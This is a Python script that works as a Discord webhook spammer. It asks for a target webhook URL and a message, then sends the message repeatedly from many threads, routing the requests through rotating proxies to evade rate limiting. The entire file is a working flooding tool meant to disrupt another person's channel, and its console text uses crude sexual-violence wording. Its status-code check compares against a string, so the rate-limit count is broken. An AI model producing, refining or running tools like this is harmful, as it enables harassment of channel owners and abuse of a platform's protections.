from discord_webhook import DiscordWebhook, DiscordEmbed
import threading, random, os, ctypes, time

proxyl = []
cpm, bad, good, cpm1, error = 0, 0, 0, 0, 0
with open("proxies.txt", "r+") as read:
    readl = read.readlines()
    for line in readl:
        line_after = line.split()[0].replace('\n', '')
        proxyl.append(line_after)

logo = """██╗    ██╗███████╗██████╗ ██████╗  █████╗ ██████╗ ███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝██████╔╝███████║██████╔╝█████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝██║  ██║██║  ██║██║     ███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                  """

print(logo + "\n")
print("Webhook link:")
webhookid = input("")
print("Message that you want to use:")
message = input("")
print("How many times do you want to send the message?")
times = int(input(""))
print("How many threads do you want to use?")
threads = int(input(""))
def look():
    global cpm, bad, good, cpm1, error
    cpm1 = cpm
    cpm = 0
    os.system('cls')
    print(logo)
    print()
    print("Webhook that will be raped: {}".format(webhookid))
    print("Spamming your webhook with the message: {}".format(message))
    print("Message sending {} times".format(times))
    print("Threads using: {}".format(threads))
    ctypes.windll.kernel32.SetConsoleTitleW(f'Sent: {good} | Bad: {bad} | Error: {error} | CPM: {cpm1*60}')
    time.sleep(1)
    threading.Thread(target=look, args=()).start()

def spam():
    global proxyl, cpm, bad, good, cpm1, error
    try:
        proxy_after = random.choice(proxyl)
        proxies = {'https': f'https://{proxy_after}', 'http': f'http://{proxy_after}'}
        webhook = DiscordWebhook(url=webhookid, content=message)
        webhook.set_proxies(proxies)
        response = webhook.execute()
        if response.status_code == "429":
            bad+=1
        else:
            cpm+=1
            good+=1
    except:
        error+=1

if "Extreme" == "Extreme":
    look()
    while 1:
        if 2 > 1:
            if threading.active_count() < int(threads):
                threading.Thread(target=spam, args=()).start()